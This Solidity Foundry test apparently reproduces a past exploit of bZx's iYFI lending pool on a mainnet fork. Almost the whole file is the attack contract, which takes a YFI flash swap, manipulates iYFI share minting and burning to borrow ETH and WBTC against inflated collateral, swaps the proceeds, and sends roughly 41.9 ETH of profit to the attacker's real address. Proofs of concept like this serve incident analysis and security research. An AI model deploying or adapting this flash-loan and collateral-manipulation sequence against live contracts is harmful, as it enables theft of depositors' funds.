
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 18695728;
    uint256 constant TX_TIMESTAMP = 1701484019;
    uint256 constant TX_BLOCK_NUMBER = 18695729;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        BzxYfiAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (BzxYfiAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = BzxYfiAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new BzxYfiAttack();
        }
    }

    function _prepareProfit(BzxYfiAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(BzxYfiAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _executeAttack(BzxYfiAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(BzxYfiAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 41882096190472257483);
    }
}

contract BzxYfiAttack {
    function attack() external payable {
        _startFlashSwap();
    }

    function flashCallback() internal {
        _callbackDone[FLASH_CALLBACK] = true;
        _readYfiBalance();
        _burnIYfiPosition();
        _mintIYfiAndReadYfi();
        _repayYfiToIYfi();
        _approveIEthBorrow();
        _borrowEthAgainstYfi();
        _wrapEthWithdrawYfi();
        _approveIWbtcBorrow();
        _borrowWbtcYfi();
        _resetWbtcApproval();
        _approveWbtcSwap();
        _swapWbtcToWeth();
        _withdrawWbtcColl();
        _cycleIYfiShares();
        _approveWethRouter();
        _swapWethForYfi();
        _repayYfiFlashSwap();
        _unwrapWethFee();
        _collectEthProfit();
    }

    function _readYfiBalance() internal {
        IERC20Like(Addresses.YFI).balanceOf(address(this));
    }

    function _burnIYfiPosition() internal {
        IERC20Like(Addresses.YFI).approve(Addresses.iYFI, type(uint256).max);
        uint256 iYfiShares = IERC20Like(Addresses.iYFI).balanceOf(address(this));
        IiYFI(Addresses.iYFI).burn(address(this), iYfiShares);
    }

    function _mintIYfiAndReadYfi() internal {
        uint256 iYfiMintAmount = 5;
        IiYFI(Addresses.iYFI).mint(address(this), iYfiMintAmount);
        IERC20Like(Addresses.YFI).balanceOf(address(this));
    }

    function _repayYfiToIYfi() internal {
        uint256 yfiRepayment = IERC20Like(Addresses.YFI).balanceOf(address(this));
        IERC20Like(Addresses.YFI).transfer(Addresses.iYFI, yfiRepayment);
        IERC20Like(Addresses.iYFI).balanceOf(address(this));
    }

    function _approveIEthBorrow() internal {
        IiETH(Addresses.iETH).loanTokenAddress();
        IERC20Like(Addresses.iYFI).approve(Addresses.iETH, type(uint256).max);
    }

    function _borrowEthAgainstYfi() internal {
        IERC20Like(Addresses.WETH).balanceOf(Addresses.iETH);
        uint256 wethBorrowAmount = 38089742649328258427;
        uint256 iYfiCollateral = 5;
        IiETH(Addresses.iETH)
            .borrow(
                bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                wethBorrowAmount,
                0,
                iYfiCollateral,
                Addresses.iYFI,
                address(this),
                address(this),
                hex""
            );
    }

    function _wrapEthWithdrawYfi() internal {
        uint256 depositAmount = address(this).balance;
        if (depositAmount > 38089742649328258427) depositAmount = 38089742649328258427;
        if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        uint256 iYfiCollateral = 5;
        IbZxProtocol(Addresses.bZxProtocol)
            .withdrawCollateral(
                bytes32(hex"57a627423b61af4d8d0971da16478bca746b9ffcf7ffd9da1de0a4f37190632f"),
                address(this),
                iYfiCollateral
            );
        IERC20Like(Addresses.iYFI).balanceOf(address(this));
    }

    function _approveIWbtcBorrow() internal {
        IiWBTC(Addresses.iWBTC).loanTokenAddress();
        IERC20Like(Addresses.iYFI).approve(Addresses.iWBTC, type(uint256).max);
    }

    function _borrowWbtcYfi() internal {
        IERC20Like(Addresses.WBTC).balanceOf(Addresses.iWBTC);
        uint256 wbtcBorrowAmount = 22651422;
        uint256 iYfiCollateral = 5;
        IiWBTC(Addresses.iWBTC)
            .borrow(
                bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                wbtcBorrowAmount,
                0,
                iYfiCollateral,
                Addresses.iYFI,
                address(this),
                address(this),
                hex""
            );
    }

    function _resetWbtcApproval() internal {
        IERC20Like(Addresses.WBTC).approve(Addresses.A_D9E1CE_8B9F, 0);
    }

    function _approveWbtcSwap() internal {
        IERC20Like(Addresses.WBTC).approve(Addresses.A_D9E1CE_8B9F, type(uint256).max);
        IERC20Like(Addresses.WBTC).balanceOf(address(this));
    }

    function _swapWbtcToWeth() internal {
        uint256 wbtcAmountIn = IERC20Like(Addresses.WBTC).balanceOf(address(this));
        if (wbtcAmountIn != 0) {
            if (IERC20Like(Addresses.WBTC).allowance(address(this), Addresses.A_D9E1CE_8B9F) < wbtcAmountIn) {
                IERC20Like(Addresses.WBTC).approve(Addresses.A_D9E1CE_8B9F, type(uint256).max);
            }
            IContract_D9E1CE_8B9F(Addresses.A_D9E1CE_8B9F)
                .swapExactTokensForTokens(
                    wbtcAmountIn, 0, _addressArray2(Addresses.WBTC, Addresses.WETH), address(this), 1701484019
                );
        }
    }

    function _withdrawWbtcColl() internal {
        uint256 iYfiCollateral = 5;
        IbZxProtocol(Addresses.bZxProtocol)
            .withdrawCollateral(
                bytes32(hex"eeb7a3aeb8069059d46f4fba0dd67c409c9fa544fccf3d6e380deb4c77983dc0"),
                address(this),
                iYfiCollateral
            );
        IERC20Like(Addresses.iYFI).balanceOf(address(this));
    }

    function _cycleIYfiShares() internal {
        uint256 iYfiShares = IERC20Like(Addresses.iYFI).balanceOf(address(this));
        IiYFI(Addresses.iYFI).burn(address(this), iYfiShares);
        IiYFI(Addresses.iYFI).mint(address(this), iYfiShares);
    }

    function _approveWethRouter() internal {
        IERC20Like(Addresses.WETH).approve(Addresses.UniswapV2Router02, type(uint256).max);
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function _swapWethForYfi() internal {
        uint256 maxWethIn = IERC20Like(Addresses.WETH).balanceOf(address(this));
        if (maxWethIn != 0) {
            if (IERC20Like(Addresses.WETH).allowance(address(this), Addresses.UniswapV2Router02) < maxWethIn)
            {
                IERC20Like(Addresses.WETH).approve(Addresses.UniswapV2Router02, type(uint256).max);
            }
            IUniswapV2Router02(Addresses.UniswapV2Router02)
                .swapTokensForExactTokens(
                    58266247670198277,
                    maxWethIn,
                    _addressArray2(Addresses.WETH, Addresses.YFI),
                    address(this),
                    1701484019
                );
        }
    }

    function _repayYfiFlashSwap() internal {
        IERC20Like(Addresses.YFI).transfer(Addresses.SLP, 19422082556732758708);
    }

    function _unwrapWethFee() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        uint256 feeAmount = 42027208518991248;
        IWETH(Addresses.WETH).withdraw(feeAmount);
        (bool ok,) = payable(Addresses.A_952222_AFE5).call{value: feeAmount}("");
        if (!ok) {}
    }

    function _collectEthProfit() internal {
        uint256 wethProfit = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IWETH(Addresses.WETH).withdraw(wethProfit);
        uint256 ethProfit = address(this).balance;
        if (ethProfit > 41985181310472257483) ethProfit = 41985181310472257483;
        (bool ok,) = payable(Addresses.attacker_eoa).call{value: ethProfit}("");
        if (!ok) {}
    }

    function _startFlashSwap() internal {
        _primeFlashSwap();
        _borrowYfiFromPair();
    }

    function _primeFlashSwap() internal {
        IContract_65D877_67C3(Addresses.A_65D877_67C3).guard(Addresses.A_65D877_67C3);


        ISLP(Addresses.SLP).token0();
        IERC20Like(Addresses.YFI).balanceOf(Addresses.SLP);
    }

    function _borrowYfiFromPair() internal {
        IUniswapV2PairLike(Addresses.SLP).swap(19363816309062560431, 0, address(this), hex"30");
    }

    receive() external payable {
        if ((address(this) == address(this) && (msg.sender == address(this) || msg.sender == Addresses.iETH))) {
            _receiveIEth();
        }
    }

    function uniswapV2Call(address sender, uint256 yfiBorrowed, uint256 wethOut, bytes calldata callbackData)
        external
        payable
    {
        sender;
        yfiBorrowed;
        wethOut;
        callbackData;
        if (!_callbackDone[FLASH_CALLBACK]) flashCallback();
        return;
    }

    function owner() external payable {
        bytes memory ret = hex"0000000000000000000000005a7c7eb8d13a53d42a15d2b1d1b694ccc5141ea5";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x4159477a) {
            _startFlashSwap();
            return;
        }
        _receiveIEth();
    }

    function _receiveIEth() internal {
        if (address(this) == address(this) && (msg.sender == address(this) || msg.sender == Addresses.iETH)) {
            _consumeEthCallback();
            return;
        }
    }

    function _consumeEthCallback() internal {
        uint256 callbackIndex = _nextEthCb(3);
        if (callbackIndex == 0) {
            return;
        }
        if (callbackIndex == 1) {
            return;
        }
        if (callbackIndex == 2) {
            return;
        }
    }

    bytes32 private constant FLASH_CALLBACK = keccak256("bzx.yfi.flashCallback");
    mapping(bytes32 => bool) private _callbackDone;

    mapping(uint256 => uint256) private _ethCallbackCursor;

    function _nextEthCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _ethCallbackCursor[index];
        _ethCallbackCursor[index] = ordinal + 1;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_contract = 0x03b7Bb750A974e0BD34795013F66B669f4110e54;
    address internal constant SLP = 0x088ee5007C98a9677165D78dD2109AE4a3D04d0C;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant iWBTC = 0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E;
    address internal constant attacker_eoa = 0x5A7C7Eb8D13A53D42A15d2B1D1b694CcC5141Ea5;
    address internal constant A_65D877_67C3 = 0x65d877B569Cc84970bAF52C38178c1adf27167c3;
    address internal constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant iYFI = 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b;
    address internal constant A_952222_AFE5 = 0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5;
    address internal constant iETH = 0xB983E01458529665007fF7E0CDdeCDB74B967Eb6;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant bZxProtocol = 0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f;
    address internal constant A_D9E1CE_8B9F = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
}

interface IContract_65D877_67C3 {
    function guard(address) external;
}

interface IContract_D9E1CE_8B9F {
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface ISLP {
    function token0() external view returns (uint256);
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IUniswapV2Router02 {
    function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IbZxProtocol {
    function withdrawCollateral(bytes32, address, uint256) external returns (uint256);
}

interface IiETH {
    function borrow(bytes32, uint256, uint256, uint256, address, address, address, bytes calldata) external;
    function loanTokenAddress() external view returns (uint256);
}

interface IiWBTC {
    function borrow(bytes32, uint256, uint256, uint256, address, address, address, bytes calldata) external;
    function loanTokenAddress() external view returns (uint256);
}

interface IiYFI {
    function burn(address, uint256) external returns (uint256);
    function mint(address, uint256) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function mint(address to) external returns (uint256 liquidity);
}
